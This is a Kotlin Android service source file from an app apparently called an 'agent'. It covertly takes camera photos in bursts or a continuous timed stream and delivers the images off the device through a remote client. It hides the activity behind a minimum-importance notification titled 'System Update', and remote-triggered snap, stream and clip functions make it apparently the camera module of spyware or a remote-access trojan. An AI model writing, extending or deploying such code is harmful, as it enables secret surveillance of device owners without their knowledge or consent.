package ai.obsidian.agent.svc

import ai.obsidian.agent.AgentApp
import ai.obsidian.agent.media.MediaSink
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.view.Surface
import androidx.camera.core.CameraSelector
import androidx.camera.core.ImageCapture
import androidx.camera.core.ImageCaptureException
import androidx.camera.core.ImageProxy
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.concurrent.Executors

class CaptureService : LifecycleService() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private val executor = Executors.newSingleThreadExecutor()
    private lateinit var app: AgentApp

    private var provider: ProcessCameraProvider? = null
    private var remaining = 1
    private var intervalMillis = 0L

    override fun onCreate() {
        super.onCreate()
        app = application as AgentApp
        createChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        startForeground(NOTIFICATION_ID, buildNotification())

        val front = intent?.getBooleanExtra(EXTRA_FRONT, false) ?: false
        remaining = intent?.getIntExtra(EXTRA_BURST, 1) ?: 1
        intervalMillis = intent?.getLongExtra(EXTRA_INTERVAL, 0L) ?: 0L

        scope.launch { bind(front) }
        return START_NOT_STICKY
    }

    private suspend fun bind(front: Boolean) = withContext(Dispatchers.Main) {
        try {
            val future = ProcessCameraProvider.getInstance(this@CaptureService)
            provider = future.get()

            val selector = if (front) {
                CameraSelector.DEFAULT_FRONT_CAMERA
            } else {
                CameraSelector.DEFAULT_BACK_CAMERA
            }

            val capture = ImageCapture.Builder()
                .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                .setTargetRotation(Surface.ROTATION_0)
                .setJpegQuality(85)
                .build()

            provider?.unbindAll()
            provider?.bindToLifecycle(this@CaptureService, selector, capture)

            delay(SETTLE_MILLIS)

            if (intervalMillis > 0L) {
                streamLoop(capture)
            } else {
                burst(capture)
            }
        } catch (throwable: Throwable) {
            app.audit.warn("camera", throwable.message.orEmpty())
            app.requireClient().let { client ->
                scope.launch { client.send("msg", "CAMERA_ERR ${throwable.message}") }
            }
            stopSelf()
        }
    }

    private fun burst(capture: ImageCapture) {
        repeat(remaining) {
            capture.takePicture(executor, object : ImageCapture.OnImageCapturedCallback() {
                override fun onCaptureSuccess(image: ImageProxy) {
                    val jpeg = MediaSink.toJpeg(image)
                    image.close()
                    scope.launch { MediaSink.deliver(app, jpeg, "cam") }
                    remaining -= 1
                    if (remaining <= 0) stopSelf()
                }

                override fun onError(exception: ImageCaptureException) {
                    app.audit.warn("camera", "code=${exception.imageCaptureError}")
                    stopSelf()
                }
            })
        }
    }

    private fun streamLoop(capture: ImageCapture) {
        scope.launch {
            while (isActive) {
                withContext(Dispatchers.Main) {
                    capture.takePicture(executor, object : ImageCapture.OnImageCapturedCallback() {
                        override fun onCaptureSuccess(image: ImageProxy) {
                            val jpeg = MediaSink.toJpeg(image)
                            image.close()
                            scope.launch { MediaSink.deliver(app, jpeg, "cam") }
                        }

                        override fun onError(exception: ImageCaptureException) {
                            app.audit.warn("stream", "code=${exception.imageCaptureError}")
                        }
                    })
                }
                delay(intervalMillis)
            }
        }
    }

    private fun createChannel() {
        val manager = getSystemService(NotificationManager::class.java)
        if (manager.getNotificationChannel(CHANNEL_ID) == null) {
            manager.createNotificationChannel(
                NotificationChannel(CHANNEL_ID, "Camera", NotificationManager.IMPORTANCE_MIN)
            )
        }
    }

    private fun buildNotification(): Notification =
        Notification.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentTitle("System Update")
            .setContentText("Camera")
            .build()

    override fun onDestroy() {
        scope.cancel()
        provider?.unbindAll()
        executor.shutdown()
        super.onDestroy()
    }

    companion object {
        private const val CHANNEL_ID = "obsidian.cam"
        private const val NOTIFICATION_ID = 0x0B51D1C
        private const val SETTLE_MILLIS = 600L
        private const val EXTRA_FRONT = "front"
        private const val EXTRA_BURST = "burst"
        private const val EXTRA_INTERVAL = "interval"

        private fun base(context: Context, front: Boolean, burst: Int, interval: Long): Intent =
            Intent(context, CaptureService::class.java)
                .putExtra(EXTRA_FRONT, front)
                .putExtra(EXTRA_BURST, burst)
                .putExtra(EXTRA_INTERVAL, interval)

        fun snap(context: Context, front: Boolean, burst: Int) {
            context.startForegroundService(base(context, front, burst, 0L))
        }

        fun startStream(context: Context, interval: Long) {
            context.startForegroundService(base(context, false, 1, interval))
        }

        fun stopStream(context: Context) {
            context.stopService(Intent(context, CaptureService::class.java))
        }

        fun clip(context: Context, seconds: Int) {
            val intent = Intent(context, ClipService::class.java).putExtra("seconds", seconds)
            context.startForegroundService(intent)
        }
    }
}
